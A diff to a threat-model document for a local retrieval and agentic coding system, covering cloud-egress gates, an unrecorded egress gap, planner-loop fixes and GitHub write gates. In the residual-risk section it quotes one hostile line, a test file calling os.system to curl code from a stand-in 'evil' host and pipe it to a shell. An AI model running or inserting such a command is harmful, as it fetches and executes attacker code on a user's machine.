@@ -33,7 +33,7 @@ consolidates the threat-model assumptions previously scattered across
 | Tenancy | **Single-tenant.** No mutual isolation between users is attempted. |
 | Data store | Embedded ChromaDB (`PersistentClient`) + local BM25 + SQLite. No HTTP DB. |
 | LLM | Local Ollama over loopback; optional Grok and/or Claude fallback (triple-gated per provider, off by default). |
-| Outbound model egress | **Two planes, both off by default.** The core graph's triple-gated fallback (`mode==hybrid` AND `<provider>.enabled` AND `user_confirmed_online`), and the out-of-band Deep Agents harness behind a six-condition chain: `agentic.enabled`, `deepagent_github.enabled`, `allow_cloud_providers`, `providers.<name>.enabled`, the provider's API-key env var present, and a per-run `--confirm-online`. Destinations are `api.x.ai` and `api.anthropic.com` only. Harness egress is recorded as egress by `agentic/deepagent_github/handoff.py` — a SHA-256 of the outbound prompt, its length, the context doc ids, and a redaction count — never the prompt text. |
+| Outbound model egress | **Two planes, both off by default.** The core graph's triple-gated fallback (`mode==hybrid` AND `<provider>.enabled` AND `user_confirmed_online`), and the out-of-band Deep Agents harness behind a six-condition chain: `agentic.enabled`, `deepagent_github.enabled`, `allow_cloud_providers`, `providers.<name>.enabled`, the provider's API-key env var present, and a per-run `--confirm-online`. Destinations are `api.x.ai` and `api.anthropic.com` only. `agentic/deepagent_github/handoff.py` implements a `HandoffEnvelope`/`sanitize_handoff` designed to record egress this way — a SHA-256 of the outbound prompt, its length, the context doc ids, and a redaction count, never the prompt text — but as of this writing `builder.py`'s `_load_runtime_model` passes the constructed cloud `BaseChatModel` straight to the DeepAgents `creator(model=model, ...)` call with no wrapping through it; `sanitize_handoff` is exercised only by its own tests. A prompt sent to a cloud provider through this path today is not recorded as egress. Wiring the two together needs the tool-calling loop to route through an envelope rather than a bare `BaseChatModel`, which is out-of-scope follow-on work, not yet implemented. |
 | Agentic / sync layers | **Out-of-band, opt-in, disabled by default.** Never imported by `gate.py`/`graph.py`/`mcp_hybrid_server.py`. |
 | Host | A machine the operator controls. Host root is **trusted**. |
 
@@ -277,6 +277,27 @@ narrower and more precise reason than "nothing executes":
   effort. No cloud-provider planner is wired here either (still local-only,
   `LocalProposerClient`). Those remain explicit future work, not silently
   implied to already exist.
+
+  **Two correctness gaps an external review caught, both fixed.** First: the
+  planner received only the operator's free-text instruction and prior
+  rejection feedback — never the repository content or task context. A
+  `--pr`/`--issue` run's already-fetched, already-injection-scanned title,
+  body, and diff were discarded before the model call, so the planner had to
+  guess complete replacement files blind. `run_real_repo_loop` now accepts an
+  optional, bounded `context` string folded into every iteration's prompt;
+  `agentic/cli.py::cmd_real_repo_run` supplies it from the fetched bundle when
+  one exists. This is plumbing, not a new read surface: the planner still
+  cannot browse the clone or request specific files mid-loop. Second: because
+  `write_file` mutates the same persistent clone across iterations (there is
+  no reset between attempts — `feedback` is meant to build ON the prior
+  attempt, not replace it), a rejected early iteration's file could remain on
+  disk and be required for a LATER, accepted iteration's checks to pass, while
+  only that later iteration's own file list was staged for commit. A `checks`
+  configuration that depended on an earlier file could pass verification
+  while the approved commit silently omitted it.
+  `RealRepoLoopResult.changed_files` now unions every iteration's writes, and
+  `cmd_real_repo_run`/`finalize_real_repo_change` use that union rather than
+  the last iteration's own list.
 - **The residual risk this changes is real and is named, not hidden.** A
   hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
   genuinely can attempt to run arbitrary code within the executor subprocess's
@@ -302,18 +323,26 @@ narrower and more precise reason than "nothing executes":
   longer; the §5 bullet above has been rewritten rather than left standing.
 - **What did NOT change: the shipped posture.** `EXECUTION_ENABLED` is still
   `False`, and `agentic.enabled` / `agentic.mode` / `agentic.writes_enabled`
-  still ship closed. Four independent gates, any one of which refuses. P10
+  still ship closed. Six independent gates, any one of which refuses (see
+  `docs/agentic/GITHUB_WRITE_ENABLEMENT.md`'s gate-chain table). P10
   deliberately did not flip the flag — arming it is a filed-checklist operator
-  procedure (`docs/agentic/GITHUB_WRITE_ENABLEMENT.md`), matching how the
-  analogous fsconnect write enablement was handled.
-- **What is gated, exactly.** `execute_write()` re-runs all four gates against
-  the live config on every call, so possessing a plan dict is not authority to
-  write. It rebuilds the argv from the plan's own params and refuses on
-  mismatch, so a tampered `would_run` is inert. It refuses a plan naming a repo
-  other than the configured one. It refuses any op outside `{pr_create}` even
-  though three are describable. It never retries: both of `run_read`'s retry
-  branches fire after the request has left the machine, so a retry could
-  duplicate an accepted mutation; a timeout is reported as INDETERMINATE.
+  procedure, matching how the analogous fsconnect write enablement was handled.
+- **What is gated, exactly.** `execute_write()` checks `agentic.enabled` first
+  -- an external review caught that this master switch was, until then,
+  enforced only by the CLI's own disabled-no-op, not by `_require_gates()`
+  itself, so a direct programmatic call could bypass it. `execute_write()` then
+  requires a FRESH `confirm=True` from its own caller: an earlier version
+  manufactured `confirm=True` internally when re-running the gate, which made
+  that gate unconditionally satisfied rather than a real per-call check -- the
+  same review caught this too. With both fixed, `execute_write()` re-runs the
+  master switch plus all four numbered gates against the live config on every
+  call, so possessing a plan dict is not authority to write. It rebuilds the
+  argv from the plan's own params and refuses on mismatch, so a tampered
+  `would_run` is inert. It refuses a plan naming a repo other than the
+  configured one. It refuses any op outside `{pr_create}` even though three
+  are describable. It never retries: both of `run_read`'s retry branches fire
+  after the request has left the machine, so a retry could duplicate an
+  accepted mutation; a timeout is reported as INDETERMINATE.
 - **The residual risk, named.** With the flag armed and the config gates opened,
   this code can push a `claude/*` branch and open a draft PR against the
   configured repo as the authenticated `gh` identity. It cannot push to `main`,
